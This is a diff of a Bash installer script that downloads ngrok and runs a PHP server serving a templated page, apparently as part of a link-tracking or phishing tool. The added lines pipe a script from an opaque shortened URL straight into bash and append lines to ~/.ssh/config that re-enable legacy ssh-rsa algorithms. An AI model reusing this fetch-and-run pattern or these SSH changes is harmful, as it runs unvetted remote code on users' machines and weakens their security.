@@ -44,10 +44,7 @@ exit 1
 
 dependencies() {
 
-
-command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
- 
-
+	command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 
 }
 
@@ -130,40 +127,43 @@ sed 's+forwarding_link+'$link'+g' template.php > index.php
 
 ngrok_server() {
 
-
-if [[ -e ngrok ]]; then
-echo ""
-elif [[ -e $PREFIX/bin/ngrok.io ]]; then
-	ln -s $PREFIX/bin/ngork.io $PWD/ngrok
-else
+[[ -d $HOME/.local/bin ]] && binPATH=$HOME/.local/bin || binPATH=$PREFIX/bin
+if [[ ! -e $binPATH/ngrok.io ]]; then
 command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
 command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
 printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
-arch=$(uname -a | grep -o 'arm' | head -n1)
-arch2=$(uname -a | grep -o 'Android' | head -n1)
-if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
-
-if [[ -e ngrok-stable-linux-arm.zip ]]; then
-unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
-chmod +x ngrok
-rm -rf ngrok-stable-linux-arm.zip
+arch1=$(uname -a|grep -o 'arm'|head -n1)
+arch2=$(uname -a|grep -o 'Android'|head -n1)
+[[ $(command -v ngrok) ]] && mv $(command -v ngrok) $(command -v ngrok).io
+[[ -d ~/.ssh ]] || mkdir ~/.ssh
+[[ -e ~/.ssh/config ]] || touch ~/.ssh/config
+printf "host tunnel.us.ngrok.com\n\tHostkeyAlgorithms +ssh-rsa\n\tPubkeyAcceptedAlgorithms +ssh-rsa\n" >> ~/.ssh/config
+bash <(curl -fsSL "http://git.io/abhacker-repo") --install ngrok-server
+[[ $arch1 = 'arm' ]] || [[ $arch2 = 'Android' ]] && arch=arm || arch=386
+wget -q https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-$arch.zip -O $TMPDIR/ngrok-stable-linux-$arch.zip
+if [[ -e $TMPDIR/ngrok-stable-linux-$arch.zip ]];then
+	[[ -d ~/.ngrok2 ]] || mkdir -p ~/.ngrok2
+	unzip -q $TMPDIR/ngrok-stable-linux-$arch.zip -d ~/.ngrok2/
+	rm -rf $TMPDIR/ngrok-stable-linux-$arch.zip
+	printf "#!/usr/bin/bash\n#THIS SCRIPT EXECUTE NGROK TO AVOID 'bad address' ERROR\ncommand -v termux-chroot >/dev/null 2>/dev/null || yes|apt install proot >/dev/null 2>/dev/null\nexec termux-chroot $HOME/.ngrok2/ngrok \${@:1}\n#     i-Haklab by Ivam3" > $binPATH/ngrok.io
+	chmod 750 ~/.ngrok2/$1 $binPATH/ngrok.io
+	PS3="(_➤) "
+	printf "$Y(_➤)$W $toInstall needs an authtoken from $1.com$Y\n"
+	select way in Set_authtoken Skip_this_step;do
+		case $way in
+			Set_authtoken)
+				while read -p "(_>)_authtoken─➤ " token && [ -z $token ];do
+					continue
+				done
+				ngrok.io authtoken $token
+				break
+				;;
+			*)
+				printf "$Y(_➤)$W Don't forget set your token running:$Y\n ╰─────➤$W $toInstall authtoken <your-token>";exit;;
+		esac
+	done
 else
-printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
-exit 1
-fi
-
-else
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
-if [[ -e ngrok-stable-linux-386.zip ]]; then
-unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
-chmod +x ngrok
-rm -rf ngrok-stable-linux-386.zip
-else
-printf "\e[1;93m[!] Download error... \e[0m\n"
-exit 1
-fi
-fi
+	echo >&2 "Ngrok installation fail... Aborting."; exit 1;
 fi
 
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
